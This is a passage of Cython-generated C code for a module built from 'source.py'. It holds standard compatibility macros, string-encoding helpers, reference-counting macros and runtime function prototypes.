  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
#else
  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyIntObject                  PyLongObject
  #define PyInt_Type                   PyLong_Type
  #define PyInt_Check(op)              PyLong_Check(op)
  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)
  #define PyInt_FromString             PyLong_FromString
  #define PyInt_FromUnicode            PyLong_FromUnicode
  #define PyInt_FromLong               PyLong_FromLong
  #define PyInt_FromSize_t             PyLong_FromSize_t
  #define PyInt_FromSsize_t            PyLong_FromSsize_t
  #define PyInt_AsLong                 PyLong_AsLong
  #define PyInt_AS_LONG                PyLong_AS_LONG
  #define PyInt_AsSsize_t              PyLong_AsSsize_t
  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
  #define PyNumber_Int                 PyNumber_Long
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
  #ifndef PyUnicode_InternFromString
    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
  #endif
#endif
#if PY_VERSION_HEX < 0x030200A4
  typedef long Py_hash_t;
  #define __Pyx_PyInt_FromHash_t PyInt_FromLong
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t
#else
  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))
#else
  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)
#endif
#if CYTHON_USE_ASYNC_SLOTS
  #if PY_VERSION_HEX >= 0x030500B1
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
  #else
    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
  #endif
#else
  #define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
    } __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)
  #if !defined(_USE_MATH_DEFINES)
    #define _USE_MATH_DEFINES
  #endif
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
  float value;
  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifndef __PYX_EXTERN_C
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__source
#define __PYX_HAVE_API__source
/* Early includes */
#ifdef _OPENMP
#include <omp.h>
#endif /* _OPENMP */

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;
                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {
    const Py_UNICODE *u_end = u;
    while (*u_end++) ;
    return (size_t)(u_end - u - 1);
}
#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))
#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    } else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif


/* Test for GCC > 2.95 */
#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else /* !__GNUC__ or GCC < 2.95 */
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif /* __GNUC__ */
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

static PyObject *__pyx_m = NULL;
static PyObject *__pyx_d;
static PyObject *__pyx_b;
static PyObject *__pyx_cython_runtime = NULL;
static PyObject *__pyx_empty_tuple;
static PyObject *__pyx_empty_bytes;
static PyObject *__pyx_empty_unicode;
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * __pyx_cfilenm= __FILE__;
static const char *__pyx_filename;


static const char *__pyx_f[] = {
  "source.py",
};

/*--- Type declarations ---*/
struct __pyx_obj_6source___pyx_scope_struct__genexpr;
struct __pyx_obj_6source___pyx_scope_struct_1_genexpr;
struct __pyx_obj_6source___pyx_scope_struct_2_genexpr;


struct __pyx_obj_6source___pyx_scope_struct__genexpr {
  PyObject_HEAD
  PyObject *__pyx_v_i;
};



struct __pyx_obj_6source___pyx_scope_struct_1_genexpr {
  PyObject_HEAD
  PyObject *__pyx_v_i;
};



struct __pyx_obj_6source___pyx_scope_struct_2_genexpr {
  PyObject_HEAD
  PyObject *__pyx_v_i;
};


/* --- Runtime support code (head) --- */
/* Refnanny.proto */
#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, int);
    void (*DECREF)(void*, PyObject*, int);
    void (*GOTREF)(void*, PyObject*, int);
    void (*GIVEREF)(void*, PyObject*, int);
    void* (*SetupContext)(const char*, int, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
          }
#else
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)
#endif
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)

/* PyObjectGetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif

/* GetBuiltinName.proto */
static PyObject *__Pyx_GetBuiltinName(PyObject *name);

/* PyDictVersioning.proto */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif

/* GetModuleGlobalName.proto */
#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  do {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif

/* PyObjectFormatSimple.proto */
#if CYTHON_COMPILING_IN_PYPY
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        PyObject_Format(s, f))
#elif PY_MAJOR_VERSION < 3
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        likely(PyString_CheckExact(s)) ? PyUnicode_FromEncodedObject(s, NULL, "strict") :\
        PyObject_Format(s, f))
#elif CYTHON_USE_TYPE_SLOTS
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        likely(PyLong_CheckExact(s)) ? PyLong_Type.tp_str(s) :\
        likely(PyFloat_CheckExact(s)) ? PyFloat_Type.tp_str(s) :\
        PyObject_Format(s, f))
#else
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        PyObject_Format(s, f))
#endif

/* PyCFunctionFastCall.proto */
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject *__Pyx_PyCFunction_FastCall(PyObject *func, PyObject **args, Py_ssize_t nargs);
#else
#define __Pyx_PyCFunction_FastCall(func, args, nargs)  (assert(0), NULL)
#endif

/* PyFunctionFastCall.proto */
#if CYTHON_FAST_PYCALL
#define __Pyx_PyFunction_FastCall(func, args, nargs)\
    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs);
#else
#define __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs) _PyFunction_FastCallDict(func, args, nargs, kwargs)
#endif
#define __Pyx_BUILD_ASSERT_EXPR(cond)\
    (sizeof(char [1 - 2*!(cond)]) - 1)
#ifndef Py_MEMBER_SIZE
#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)
#endif
#if CYTHON_FAST_PYCALL
  static size_t __pyx_pyframe_localsplus_offset = 0;
  #include "frameobject.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
  #define __Pxy_PyFrame_Initialize_Offsets()\
    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\
     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f_localsplus)))
  #define __Pyx_PyFrame_GetLocalsplus(frame)\
    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))
#endif // CYTHON_FAST_PYCALL
#endif

/* PyObjectCall.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif

/* PyObjectCall2Args.proto */
static CYTHON_UNUSED PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2);

/* PyObjectCallMethO.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg);
#endif

/* PyObjectCallOneArg.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg);

/* PyObjectCallNoArg.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func);
#else
#define __Pyx_PyObject_CallNoArg(func) __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL)
#endif

/* IncludeStringH.proto */
#include <string.h>

/* JoinPyUnicode.proto */
static PyObject* __Pyx_PyUnicode_Join(PyObject* value_tuple, Py_ssize_t value_count, Py_ssize_t result_ulength,
                                      Py_UCS4 max_char);

/* PyIntCompare.proto */
static CYTHON_INLINE PyObject* __Pyx_PyInt_EqObjC(PyObject *op1, PyObject *op2, long intval, long inplace);

/* DictGetItem.proto */
#if PY_MAJOR_VERSION >= 3 && !CYTHON_COMPILING_IN_PYPY
static PyObject *__Pyx_PyDict_GetItem(PyObject *d, PyObject* key);
#define __Pyx_PyObject_Dict_GetItem(obj, name)\
    (likely(PyDict_CheckExact(obj)) ?\
     __Pyx_PyDict_GetItem(obj, name) : PyObject_GetItem(obj, name))
#else
#define __Pyx_PyDict_GetItem(d, key) PyObject_GetItem(d, key)
#define __Pyx_PyObject_Dict_GetItem(obj, name)  PyObject_GetItem(obj, name)
#endif

/* RaiseArgTupleInvalid.proto */
static void __Pyx_RaiseArgtupleInvalid(const char* func_name, int exact,
    Py_ssize_t num_min, Py_ssize_t num_max, Py_ssize_t num_found);

/* RaiseDoubleKeywords.proto */
static void __Pyx_RaiseDoubleKeywordsError(const char* func_name, PyObject* kw_name);

/* ParseKeywords.proto */
static int __Pyx_ParseOptionalKeywords(PyObject *kwds, PyObject **argnames[],\
    PyObject *kwds2, PyObject *values[], Py_ssize_t num_pos_args,\
    const char* function_name);

/* BytesEquals.proto */
static CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals);

/* UnicodeEquals.proto */
static CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals);

/* GetTopmostException.proto */
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem * __Pyx_PyErr_GetTopmostException(PyThreadState *tstate);
#endif

/* PyThreadStateGet.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  PyErr_Occurred()
#endif

/* SaveResetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSave(type, value, tb)  __Pyx__ExceptionSave(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#define __Pyx_ExceptionReset(type, value, tb)  __Pyx__ExceptionReset(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
#else
#define __Pyx_ExceptionSave(type, value, tb)   PyErr_GetExcInfo(type, value, tb)
#define __Pyx_ExceptionReset(type, value, tb)  PyErr_SetExcInfo(type, value, tb)
#endif

/* PyErrExceptionMatches.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_ExceptionMatches(err) __Pyx_PyErr_ExceptionMatchesInState(__pyx_tstate, err)
static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err);
#else
#define __Pyx_PyErr_ExceptionMatches(err)  PyErr_ExceptionMatches(err)
#endif

/* GetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_GetException(type, value, tb)  __Pyx__GetException(__pyx_tstate, type, value, tb)
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb);
#endif

/* PyErrFetchRestore.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
